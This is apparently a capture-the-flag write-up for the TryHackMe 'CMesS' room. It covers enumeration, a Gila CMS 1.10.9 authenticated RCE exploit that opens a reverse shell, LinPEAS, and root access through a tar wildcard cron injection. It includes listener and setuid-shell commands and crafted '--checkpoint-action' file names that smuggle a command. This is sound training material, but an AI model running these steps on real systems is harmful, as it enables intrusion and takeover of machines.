# TryHackMe: CMesS
https://tryhackme.com/room/cmess


## 1. Enumeration

### 1.1. port scanning

Scan the ports of the target machine
```sudo nmap -T 4 -p- -A X.X.X.X ```

<img width="857" height="549" alt="image" src="https://github.com/user-attachments/assets/012fb50e-7ce3-4c68-9ce4-10426d2a029a" />

As observed in above screenshot, open ports discovered are 80 (HTTP) and 22 (SSH).
The HTTP service is further probed first.

### 1.2. sub-domain enumeration
As per suggested in the challenge description, the domain cmess.thm is added as an entry of /etc/hosts so that this domain can be resolved to its corresponding IP Address.
Then enumerate the subdomains of cmess.thm using 

``` wfuzz -c -f sub-fighter -w subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" ```.

The subdomains-top1million-5000.txt file can be downloaded from https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt

<img width="902" height="534" alt="image" src="https://github.com/user-attachments/assets/c5316b98-1b3a-4b8c-a9de-96ab7430d749" />
<img width="687" height="791" alt="image" src="https://github.com/user-attachments/assets/ec6a17dd-73cd-407f-9829-892698c2d228" />

As observed, the sub-domain dev.cmess.thm stands out due to its response having 104 Words amongst all other 290 words. The 290 words is due to the page not being found.

Then, the sub-domain dev.cmess.thm is added as an entry of /etc/hosts so that this domain can be resolved to its corresponding IP Address.

<img width="487" height="155" alt="image" src="https://github.com/user-attachments/assets/2dcd7ee0-a472-4cd4-93b0-6cbb3356b91c" />

Navigating to http://dev.cmess.thm

<img width="1277" height="595" alt="image" src="https://github.com/user-attachments/assets/9cd98646-1151-4a01-b64e-471d98b5cb94" />

The user credentials for user *andre@cmess.thm* seemed to have been leaked, with the password being *"KPFTN_f2yxe%"*.
Also, based on this development log, there is mention of an *admin panel*. 
Next step is enumerate the web service to verify whether an admin panel indeed exists so that these leaked credentials can be tested against.

### 1.3. web subdirectory enumeration on Port 80 (HTTP)

Using DirBuster by running ```dirb&``` , with the below configuration:

<img width="762" height="531" alt="image" src="https://github.com/user-attachments/assets/8b0ffe11-f6d3-4be1-b66e-4fa0778a2f32" />

<img width="757" height="539" alt="image" src="https://github.com/user-attachments/assets/a77bf7c6-d001-48be-92a0-ac6304dca540" />

As per above, /admin subdirectory is found.

And navigating to http://cmess.thm/admin shows a login page.

<img width="1274" height="733" alt="image" src="https://github.com/user-attachments/assets/864afe30-e1b8-4031-a8f6-de64e6ef4034" />



### 1.4. Accessing the admin panel using leaked user credentials

The leaked credentials found (E-mail: *andre@cmess.thm* and Password: *KPFTN_f2yxe%*.) are tested:

<img width="695" height="471" alt="image" src="https://github.com/user-attachments/assets/6807dbce-b933-47f2-aeed-80127de4e328" />

And as per below screenshot, login into the admin panel as andre is successful.

<img width="1310" height="443" alt="image" src="https://github.com/user-attachments/assets/e5673cdb-4071-4b28-9eab-db58f67a60ca" />


## 2. Exploitation

### 2.1. researching vulnerability


<img width="1919" height="787" alt="image" src="https://github.com/user-attachments/assets/cb978d0d-2f2d-4397-9055-6fb6b8447549" />

As per above screenshot, it is discovered that the platform runs on *Gila CMS version 1.10.9*

Online researching *Gila CMS version 1.10.9* : 
- Found possible exploit (https://www.exploit-db.com/exploits/51569)
   
It is observed that this exploit is a python script that requires authentication to upload a reverse shell php file for the web application to run so that remote commands can be executed.

### 2.2. exploiting vulnerability

Firstly, set up a listener (port 4444) on the attacker machine: ```nc -lvnp 4444``` <br> <br>
<img width="366" height="203" alt="image" src="https://github.com/user-attachments/assets/3e5a9268-42ee-4ae0-abe9-865aa9718522" />

Then, the exploit is downloaded as *gila_cms_rce_1.10.9.py*. <br>
Using ```chmod +x gila_cms_rce_1.10.9.py``` to allow executable permissions, then run this exploit using ```python3 gila_cms_rce_1.10.9.py``` and then set the options accordingly to the target and attacker machine <br>

<img width="829" height="414" alt="image" src="https://github.com/user-attachments/assets/b45c83b6-6c8e-4913-acc3-e96d5b0fc849" />

The reverse shell is caught.

<img width="687" height="193" alt="image" src="https://github.com/user-attachments/assets/2e55632b-9fc2-4ff0-af3e-67e1e7f71adb" />

However, there is limited further attacks that can be done under the username *www-data*

### 2.3. escalating privileges to user andre
Hence privileges need to be escalated.

<img width="727" height="534" alt="image" src="https://github.com/user-attachments/assets/2061ac0f-2139-4552-b770-8588dd73677c" />

From above screenshot, under the context of *www-data*, a download is initiated from the attacker's machine for the script tool LinPEAS - Linux Privilege Escalation Awesome Script (https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). And then add execution permission to this script that is named "*linpeas.sh*".
This script is to automate enumeration for attack vectors to escalate privilege.

Run the script using command: ```./linpeas.sh``` <br>
<img width="815" height="641" alt="image" src="https://github.com/user-attachments/assets/4a48bb6b-e01c-450d-a03a-a62e7b101816" />

Amongst all the other enumerated information, the above snippet of the output of the script shows possible passwords or credential files which are hiding in plain sight.
The file */opt/.password.bak* stands out in particular due to the directory location.

<img width="481" height="94" alt="image" src="https://github.com/user-attachments/assets/debc9da6-8e57-4334-9a07-b35c6ac7db19" />

Printing out the file contents as per above screenshot, it is discovered that this file has a probable password *UQfsdCB7aAP6* for the user andre.

Based on the earlier port scan, there is also a SSH service. This password can be tested there.

<img width="602" height="220" alt="image" src="https://github.com/user-attachments/assets/2d336627-c999-479b-b23a-bafd29b27f42" />

As per above screenshot, the attacker is able to access the target machine via SSH using the username: *andre* and password: *UQfsdCB7aAP6*.


## 3. Post-Exploitation
### 3.1. post-exploitation enumeration

Enumerating scheduled tasks (```cat /etc/crontab```) as per below. <br>

<img width="870" height="279" alt="image" src="https://github.com/user-attachments/assets/f92a1d53-db93-4c7c-bf05-82a4e4280757" />

It is discovered that all content in the directory /home/andre/backup is to be archived by the tar (tape archive) tool.
And this is scheduled to be run under the context of root user every two minutes.
However the use of the wildcard * in tar archiving can be exploited.

### 3.2. privilege escalation using cron wildcard

Essentially, the attacker could create a malicious script in the backup folder for tar tool to run during the archival task.

Run the commands: <br>
``` echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > hello.sh ``` (Ensure to copy the hello.sh to the directory /home/andre/backup) <br>
``` chmod +x hello.sh ```<br>
<img width="619" height="34" alt="image" src="https://github.com/user-attachments/assets/16561513-1b1a-492f-b653-5808fd6a02ec" />

``` touch /home/user/--checkpoint=1 ```<br>
``` touch /home/user/--checkpoint-action=exec=sh\ hello.sh ```<br>
<img width="694" height="191" alt="image" src="https://github.com/user-attachments/assets/46e5c440-0051-4d14-a2a5-490b040ed773" />

Verify that /tmp/bash is already written by the script when the scheduled task executes <br>
<img width="449" height="37" alt="image" src="https://github.com/user-attachments/assets/e16a20a7-c160-4d51-87f6-c87ab8236f16" />

Run ```/tmp/bash -p``` to get root shell.<br>
<img width="384" height="74" alt="image" src="https://github.com/user-attachments/assets/596c0989-b2ab-4a3e-8bad-f05962bfb9cb" />





